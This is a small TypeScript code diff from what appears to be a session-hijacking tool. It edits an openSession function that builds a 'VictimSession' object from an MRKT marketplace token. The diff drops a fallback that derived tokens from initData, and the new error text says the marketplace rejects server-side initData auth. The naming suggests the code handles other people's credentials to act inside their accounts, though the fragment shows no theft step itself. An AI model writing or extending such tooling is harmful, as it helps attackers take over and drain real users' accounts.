@@ -1,4 +1,3 @@
-import { authFromInitData } from "./client.js";
 import { config } from "../config.js";
 
 export type VictimSession = {
@@ -31,10 +30,9 @@ export async function openSession(input: {
     if (s && s.expiresAt > Date.now()) return s;
   }
 
-  let mrktToken = input.mrktToken?.trim();
+  const mrktToken = input.mrktToken?.trim();
   if (!mrktToken) {
-    if (!input.initData) throw new Error("initData or mrktToken required");
-    mrktToken = await authFromInitData(input.initData);
+    throw new Error("mrktToken required (MRKT rejects server initData auth)");
   }
   const now = Date.now();
   const session: VictimSession = {
